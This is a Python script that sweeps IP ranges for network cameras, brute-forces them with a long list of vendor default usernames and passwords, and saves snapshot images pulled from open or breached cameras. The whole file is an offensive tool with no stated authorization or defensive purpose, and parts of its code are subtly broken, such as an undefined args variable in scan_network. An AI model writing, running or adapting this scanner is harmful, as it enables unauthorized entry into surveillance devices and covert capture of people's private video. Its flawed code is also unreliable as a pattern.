import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import product
from datetime import datetime
import os
import urllib3
import cv2
import numpy as np
from PIL import Image
import io
import threading
import socket
import random
import ipaddress
import argparse
import time
import uuid
import logging
from queue import Queue

# Configure logging
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
urllib3.disable_warnings()

RESULTS_FILE = "found_cameras.txt"
SCREENSHOTS_DIR = "camera_screenshots"
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
discovered = Queue()

DEFAULT_CREDS = [
    None, 
    ('admin', 'admin'),
    ('admin', ''),
    ('admin', 'password'),
    ('admin', '12345'),
    ('admin', '123456'),
    ('admin', '1234'),
    ('admin', 'admin123'),
    ('admin', 'pass123'),
    ('admin', '11111'),
    ('admin', '54321'),
    ('admin', '111111'),
    ('admin', '666666'),
    ('admin', '1234567'),
    ('admin', '12345678'),
    ('admin', 'abc123'),
    ('admin', 'pass'),
    ('root', 'root'),
    ('root', ''),
    ('root', 'pass'),
    ('root', 'password'),
    ('root', 'admin'),
    ('root', '12345'),
    ('root', '123456'),
    ('supervisor', 'supervisor'),
    ('admin1', 'admin1'),
    ('administrator', 'administrator'),
    ('administrator', 'admin'),
    ('ubnt', 'ubnt'), 
    ('service', 'service'),
    ('support', 'support'),
    ('user', 'user'),
    ('guest', 'guest'),
    ('default', 'default'),
    ('system', 'system'),
    ('admin', '9999'), 
    ('admin', '123456789'), 
    ('hikvision', 'hikvision'),
    ('admin', 'hikvision'),
    ('admin', '12345678a'), 
    ('dahua', 'dahua'),
    ('admin', 'dahua'),
    ('admin', '888888'), 
    ('axis', 'axis'),
    ('root', 'pass'), 
    ('viewer', 'viewer'), 
    ('admin', 'meinsm'), 
    ('admin', '4321'), 
    ('foscam', 'foscam'),
    ('admin', 'foscam'),
    ('amcrest', 'amcrest'),
    ('admin', 'amcrest'),
    ('reolink', 'reolink'),
    ('admin', 'reolink'),
    ('lorex', 'lorex'),
    ('admin', 'lorex'),
    ('swann', 'swann'),
    ('admin', 'swann'),
    ('admin', 'tlJwpbo6'), 
    ('admin', 'Hikvision2020'), 
    ('admin', 'HikAdmin2020'), 
    ('admin', 'hik12345'), 
    ('admin', 'hikadmin'), 
    ('admin', 'dahua2020'), 
    ('admin', 'DahuaAdmin'), 
    ('admin', 'dh12345'), 
    ('admin', 'dahuaadmin'), 
    ('admin', 'axis2020'), 
    ('admin', 'AxisAdmin'), 
    ('admin', 'ax12345'), 
    ('admin', 'axisadmin'), 
]

CAMERA_SIGS = [
    'ipcamera',
    'netcam',
    'webcam',
    'web camera',
    'ip camera',
    'network camera',
    'onvif',
    'rtsp',
    'hikvision',
    'dahua',
    'axis',
    'foscam',
    'amcrest',
    'reolink',
    'ubiquiti',
    'lorex',
    'swann',
    'hanwha',
    'vivotek',
    'bosch',
    'panasonic',
    'trendnet',
    'dlink',
    'geovision',
    'avigilon',
    'mobotix',
    'arecont',
    'acti',
    'samsung',
    'toshiba',
    'uniview',
    'pelco',
    'honeywell',
    'flir',
    'basler',
    'zavio',
    'grandstream',
    'milesight',
    'provision-isr',
    'watchnet',
    'digital watchdog',
    'microseven',
    'annke',
    'zosi',
    'zmodo',
    'ivideon',
    'wyze',
    'tapo',
    'eufy',
    'arlo',
    'nest cam',
    'blink',
    'ring camera',
    'unifi protect',
    'yoosee',
    'vstarcam',
    'wansview',
    'sricam',
    'floureon',
    'video server',
    'network video',
    'nvr',
    'dvr',
    'ipcam',
    'netcam',
    'webcamxp',
    'webcam 7',
    'blue iris',
    'surveillance',
    'cctv',
]

CAMERA_HEADERS = [
    'server',
    'www-authenticate',
    'x-camera-id',
    'x-powered-by',
    'x-frame-options',
    'x-content-type-options',
]

CAMERA_PATHS = ["/", "/index.html", "/login.html", "/admin.html", "/cgi-bin/"]

def is_camera(url, r=None):
    try:
        if not r:
            r = requests.get(url, timeout=2, verify=True)
            
        headers_lower = {k.lower(): v.lower() for k, v in r.headers.items()}
        if r.status_code == 401 and 'www-authenticate' in headers_lower:
            return True
            
        content = r.text.lower()
        headers_str = str(headers_lower)
        
        for sig in CAMERA_SIGS:
            if sig.lower() in content or sig.lower() in headers_str:
                logging.info(f"Camera detected at {url}")
                return True
                
        for header in CAMERA_HEADERS:
            header_lower = header.lower()
            if header_lower in headers_lower:
                header_val = headers_lower[header_lower]
                for sig in CAMERA_SIGS:
                    if sig.lower() in header_val:
                        logging.info(f"Camera detected at {url}")
                        return True
                        
        if 'rtsp://' in content or 'rtmp://' in content:
            logging.info(f"Camera detected at {url}")
            return True
            
        if any(x in content for x in ['mjpg', 'mjpeg', 'cgi-bin/video', 'videostream', 'snapshot.cgi']):
            logging.info(f"Camera detected at {url}")
            return True
            
        return False
    except requests.exceptions.RequestException as e:
        logging.error(f"Request error in is_camera for {url}: {str(e)}")
    except ValueError as e:
        logging.error(f"Value error in is_camera for {url}: {str(e)}")
    except Exception as e:
        logging.error(f"Unexpected error in is_camera for {url}: {str(e)}")
        raise e

def capture_camera_image(url, auth=None):
    try:
        if url.startswith('rtsp://'):
            return capture_rtsp(url)
            
        if not url.startswith('http'):
            url = f'http://{url}'
            
        paths = [
            '/Streaming/channels/1/picture',
            '/cgi-bin/snapshot.cgi',
            '/snap.jpg',
            '/snapshot.jpg',
            '/image.jpg',
            '/video.cgi',
            '/image/jpeg.cgi',
            '/mjpg/video.mjpg',
            '/cgi-bin/video.jpg',
            '/live.jpg',
            '/onvif-http/snapshot',
            '/axis-cgi/jpg/image.cgi',
            '/webcapture.jpg?command=snap',
            '/media/video1/jpeg',
            '/live/ch0',
            '/live/stream',
            '/live/1/jpeg.jpg',
            '/live_stream',
            '/image1',
            '/video1',
            '/cam/realmonitor',
            '/videostream.cgi',
            '/img/snapshot.cgi',
            '/cgi-bin/camera.cgi',
            '/jpeg',
            '/picture',
            '/image',
            '/still',
            '/capture',
            '/frame',
        ]
        
        for path in paths:
            try:
                img_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
                r = requests.get(img_url, timeout=2, verify=True, auth=auth, 
                               headers={'Accept': 'image/jpeg,image/png,image/*'})
                r.close()
                
                content_type = r.headers.get('Content-Type', '').lower()
                if r.status_code == 200 and ('image' in content_type or 'video' in content_type or len(r.content) > 1000):
                    try:
                        img = Image.open(io.BytesIO(r.content))
                        if img.size[0] < 32 or img.size[1] < 32:
                            continue
                            
                        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                        safe_url = url.replace('://', '_').replace('/', '_').replace(':', '_')
                        auth_str = '_auth' if auth else '_open'
                        filename = f"{SCREENSHOTS_DIR}/screenshot_{uuid.uuid4()}.jpg"
                        
                        if img.mode != 'RGB':
                            img = img.convert('RGB')
                        img.save(filename, 'JPEG', quality=95)
                        
                        logging.info(f"Successfully captured image from {img_url}")
                        return True
                    except Exception as e:
                        logging.error(f"Error processing image from {img_url}: {str(e)}")
                        continue
            except requests.exceptions.RequestException as e:
                logging.error(f"Request error for {img_url}: {str(e)}")
                continue
                
        try:
            mjpeg_paths = ['/video.mjpg', '/mjpg/video.mjpg', '/videostream.mjpg']
            for path in mjpeg_paths:
                try:
                    mjpeg_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
                    r = requests.get(mjpeg_url, timeout=2, verify=True, auth=auth, stream=True)
                    
                    if r.status_code == 200 and 'multipart' in r.headers.get('Content-Type', '').lower():
                        boundary = r.headers['Content-Type'].split('boundary=')[1]
                        content = b''
                        start_time = time.time()
                        max_time = 5  # Maximum 5 seconds for MJPEG capture
                        max_size = 10 * 1024 * 1024  # Maximum 10MB buffer
                        
                        for chunk in r.iter_content(chunk_size=1024):
                            content += chunk
                            if len(content) > max_size:
                                logging.error(f"MJPEG buffer exceeded max size for {mjpeg_url}")
                                break
                                
                            if time.time() - start_time > max_time:
                                logging.error(f"MJPEG capture timeout for {mjpeg_url}")
                                break
                                
                            if b'\r\n\r\n' in content:
                                try:
                                    frame = content.split(b'\r\n\r\n')[1].split(boundary.encode())[0]
                                    img = Image.open(io.BytesIO(frame))
                                    
                                    if img.size[0] < 32 or img.size[1] < 32:
                                        logging.error(f"MJPEG frame too small from {mjpeg_url}")
                                        break
                                        
                                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                                    safe_url = url.replace('://', '_').replace('/', '_').replace(':', '_')
                                    auth_str = '_auth' if auth else '_open'
                                    filename = f"{SCREENSHOTS_DIR}/screenshot_{uuid.uuid4()}.jpg"
                                    
                                    if img.mode != 'RGB':
                                        img = img.convert('RGB')
                                    img.save(filename, 'JPEG', quality=95)
                                    
                                    logging.info(f"Successfully captured MJPEG frame from {mjpeg_url}")
                                    return True
                                except Exception as e:
                                    logging.error(f"Error processing MJPEG frame from {mjpeg_url}: {str(e)}")
                                    break
                except requests.exceptions.RequestException as e:
                    logging.error(f"Request error for MJPEG {mjpeg_url}: {str(e)}")
                    continue
        except Exception as e:
            logging.error(f"Error in MJPEG capture for {url}: {str(e)}")
            
        return False
    except requests.exceptions.RequestException as e:
        logging.error(f"Request error in capture_camera_image for {url}: {str(e)}")
    except Exception as e:
        logging.error(f"Unexpected error in capture_camera_image for {url}: {str(e)}")
        raise e

def capture_rtsp(url):
    try:
        cap = cv2.VideoCapture(url)
        if not cap.isOpened():
            logging.error("Failed to open RTSP stream")
            return
            
        max_tries = 5
        frame = None
        for i in range(max_tries):
            ret, frame = cap.read()
            if ret and frame is not None and frame.size > 0:
                break
            logging.error(f"Attempt {i+1}/{max_tries} failed to read RTSP frame from {url}")
            time.sleep(0.1)
            
        cap.release()
        
        if frame is not None and frame.size > 0:
            if frame.shape[0] < 32 or frame.shape[1] < 32:
                logging.error(f"RTSP frame too small from {url}")
                return False
                
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            safe_url = url.replace('://', '_').replace('/', '_').replace(':', '_')
            filename = f"{SCREENSHOTS_DIR}/screenshot_{uuid.uuid4()}.jpg"
            
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame_rgb)
            img.save(filename, 'JPEG', quality=95)
            
            logging.info(f"Successfully captured RTSP frame from {url}")
            return True
            
        logging.error(f"Failed to capture valid frame from RTSP stream: {url}")
        return False
    except Exception as e:
        logging.error(f"Error in RTSP capture for {url}: {str(e)}")
        raise e

def save_camera(url, reason):
    if not discovered.full():
        discovered.put(url)
        logging.info(f"Found camera: {url} ({reason})")
        threading.Thread(target=lambda: capture_camera_image(url)).start()
        with open(RESULTS_FILE, "a") as f:
            f.write(f"{datetime.now()} - {url} - {reason}\n")

def try_auth(url):
    for creds in DEFAULT_CREDS:
        try:
            if not creds:
                continue
                
            r = requests.get(url, auth=creds, timeout=1, verify=True)
            r.close()
            
            if r.status_code == 200:
                if capture_camera_image(url, auth=creds):
                    logging.info(f"Successfully logged in with credentials for {url}")
                    return True
                    
        except requests.exceptions.RequestException as e:
            logging.error(f"Request error in try_auth for {url}: {str(e)}")
        except Exception as e:
            logging.error(f"Unexpected error in try_auth for {url}: {str(e)}")
            raise e
    return False

# Increase timeout duration and number of retries
TIMEOUT = 10.0  # Increased from 5.0 to 10.0 seconds
RETRIES = 5  # Increased from 3 to 5 retries

def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)  # Validate IP format
        return True
    except socket.error:
        return False

def scan_ip(ip):
    if not is_valid_ip(ip):
        logging.error(f"Invalid IP address: {ip}")
        return False

    url = str(ip)
    for attempt in range(RETRIES):
        try:
            r = requests.get(f'http://{url}', timeout=TIMEOUT, verify=True)
            r.close()
            if is_camera(url, r):
                save_camera(url, 'Open camera')
                if capture_camera_image(url):
                    save_camera(url, 'Successfully captured open camera image')
                    return True
                if try_auth(url):
                    save_camera(url, 'Successfully authenticated and captured image')
                    return True
            return True  # Return true if successful
        except requests.exceptions.RequestException as e:
            logging.error(f"Attempt {attempt + 1} failed for {url}: {str(e)}")
            if attempt == RETRIES - 1:
                logging.error(f"Max retries exceeded for {url}. Skipping.")
            continue
    return False

def quick_port_scan(ip):
    logging.debug(f"Starting quick_port_scan for {ip}")
    open_ports = []
    common_ports = [80, 81, 82, 83, 84, 85, 88, 443, 554, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 34567, 37777]
    
    with ThreadPoolExecutor(max_workers=100) as ex:
        def check_single_port(port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((str(ip), port)) == 0:
                    open_ports.append(port)
                s.close()
            except:
                pass
        list(ex.map(check_single_port, common_ports))
    return open_ports

def check_port(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        if s.connect_ex((str(ip), port)) == 0:
            with ThreadPoolExecutor(max_workers=50) as ex:
                futs = [ex.submit(quick_check_url, ip, port, path) for path in CAMERA_PATHS]
                for f in as_completed(futs):
                    if f.result():
                        break
        s.close()
    except:
        pass

def quick_check_url(ip, port, path):
    base_url = f"http://{ip}:{port}"
    url = base_url + path
    try:
        r = requests.get(url, timeout=TIMEOUT, verify=True)
        r.close()
        
        if r.status_code in [200, 301, 302, 401, 403]:
            if any(sig in r.headers.get('Server', '').lower() for sig in CAMERA_SIGS):
                save_camera(url, "Camera server header")
                if r.status_code in [401, 403]:
                    threading.Thread(target=try_default_creds, args=(url,)).start()
                return True
            if 'rtsp://' in r.text.lower():
                save_camera(url, "RTSP URL found")
                if r.status_code in [401, 403]:
                    threading.Thread(target=try_default_creds, args=(url,)).start()
                return True
            if any(sig in r.text.lower() for sig in CAMERA_SIGS):
                save_camera(url, "Camera signature found")
                if r.status_code in [401, 403]:
                    threading.Thread(target=try_default_creds, args=(url,)).start()
                return True
            if r.status_code in [401, 403]:
                save_camera(url, "Auth required - trying default credentials")
                threading.Thread(target=try_default_creds, args=(url,)).start()
                return True
    except requests.exceptions.RequestException as e:
        logging.error(f"Request error in quick_check_url: {str(e)}")
    except Exception as e:
        logging.error(f"Unexpected error in quick_check_url: {str(e)}")
    return False

def try_default_creds(url):
    for creds in DEFAULT_CREDS:
        try:
            if not creds:
                continue
                
            r = requests.get(url, auth=creds, timeout=TIMEOUT, verify=True)
            r.close()
            
            if r.status_code == 200:
                if capture_camera_image(url, auth=creds):
                    logging.info(f"Successfully logged in with credentials for {url}")
                    return True
                    
        except requests.exceptions.RequestException as e:
            logging.error(f"Request error in try_default_creds for {url}: {str(e)}")
        except Exception as e:
            logging.error(f"Unexpected error in try_default_creds for {url}: {str(e)}")
            raise e
    return False

def scan_network(network):
    logging.debug(f"Starting scan_network for {network}")
    ips = list(ipaddress.ip_network(network).hosts())
    total_ips = len(ips)  # Count total IPs to scan
    random.shuffle(ips)

    start_time = time.time()  # Start time tracking
    with ThreadPoolExecutor(max_workers=50) as executor:
        list(executor.map(scan_ip, ips))

    elapsed_time = time.time() - start_time  # Calculate elapsed time
    logging.info(f"Scanning completed. Elapsed time: {elapsed_time:.2f} seconds")
    logging.info(f"Final total IPs scanned: {total_ips}")  # Log final total IPs only once
    estimated_completion_time = elapsed_time / total_ips * len(args.ranges)
    logging.info(f"Estimated completion time for all networks: {estimated_completion_time:.2f} seconds")

def main():
    logging.debug("Starting main function")
    logging.basicConfig(level=logging.INFO)
    
    parser = argparse.ArgumentParser()
    default_ranges = [
        '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '169.254.0.0/16',
    ]
    
    parser.add_argument('--threads', type=int, default=50,
                        help='Maximum number of concurrent threads (default: 50)')
    parser.add_argument('--ranges', type=str, default=default_ranges,
                        help='Comma-separated list of IP ranges to scan')
    args = parser.parse_args()
    
    logging.info(f"Starting aggressive scan of {len(args.ranges)} networks with {args.threads} threads...")
    logging.info("Default ranges:")
    for r in args.ranges:
        logging.info(f"  - {r}")
    
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        ex.map(scan_network, args.ranges)
        
    logging.info("\nScan complete! Check found_cameras.txt for results")
    logging.info(f"Screenshots saved in: {SCREENSHOTS_DIR}/")

if __name__ == '__main__':
    main()
